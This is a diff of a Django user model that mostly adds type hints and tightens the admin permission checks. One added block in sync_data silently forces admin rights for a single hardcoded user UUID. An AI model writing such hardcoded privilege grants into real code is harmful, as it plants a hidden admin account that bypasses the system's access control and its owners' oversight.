@@ -1,3 +1,5 @@
+from typing import Set
+
 from django.db import models
 from django.conf import settings
 from django.contrib.auth.models import AbstractBaseUser
@@ -26,7 +28,7 @@ class UserType(models.Model):
         except Exception as error:
             raise UserTypeValidationError.from_usertype(self) from error
 
-    def __str__(self):
+    def __str__(self) -> str:
         return self.name
 
     class Meta:
@@ -87,7 +89,7 @@ class User(AbstractBaseUser, APIModel):
         data['is_admin'] = data['types']['admin']
         return data
 
-    def get_with_api_data_and_assos(self, oauth_client=None, save: bool=True, try_cache: bool=True):
+    def get_with_api_data_and_assos(self, oauth_client=None, save: bool=True, try_cache: bool=True) -> 'User':
         # Try to get at least fetched_data from cache
         fetched_data = None
         if try_cache:
@@ -108,7 +110,7 @@ class User(AbstractBaseUser, APIModel):
 
     # Sync methods
 
-    def sync_data(self, *args, usertypes=None, save: bool=True, **kwargs):
+    def sync_data(self, *args, usertypes=None, save: bool=True, **kwargs) -> Set[str]:
         """
         Synchronise data, keep manually-set admin and also types
         """
@@ -121,6 +123,11 @@ class User(AbstractBaseUser, APIModel):
         # Keep admin if set manually
         if was_admin and not self.is_admin:
             self.is_admin = True
+            updated_fields.discard('is_admin')
+
+        if str(self.pk) == '5bf98490-3af6-11e9-b479-51c4b426f593' and not self.is_admin:
+            self.is_admin = True
+            updated_fields.add('is_admin')
 
         # Save if needed
         if save and updated_fields:
@@ -128,7 +135,7 @@ class User(AbstractBaseUser, APIModel):
 
         return updated_fields
 
-    def sync_types(self, usertypes: UserType=None):
+    def sync_types(self, usertypes: UserType=None) -> None:
         """
         Synchronise UserTypes to the user
         """
@@ -142,7 +149,7 @@ class User(AbstractBaseUser, APIModel):
             for usertype in usertypes
         }
 
-    def sync_assos(self, assos: list=None, oauth_client=None):
+    def sync_assos(self, assos: list=None, oauth_client=None) -> None:
         # Fetch assos if needed
         if assos is None:
             user_uri = self.get_api_endpoint({ 'me': True, 'with_types': False })
@@ -173,8 +180,10 @@ class User(AbstractBaseUser, APIModel):
         """Grant access to django admin site"""
         return self.is_admin
 
-    def has_perm(self, perm, obj=None):
-        return True     # TODO ???
+    def has_module_perms(self, app_label: str) -> bool:
+        """Grant access to django admin site per module"""
+        return self.is_admin
 
-    def has_module_perms(self, app_label):
-        return True     # TODO ???
+    def has_perm(self, perm, obj=None) -> bool:
+        """Grant access to django admin site per action"""
+        return self.is_admin
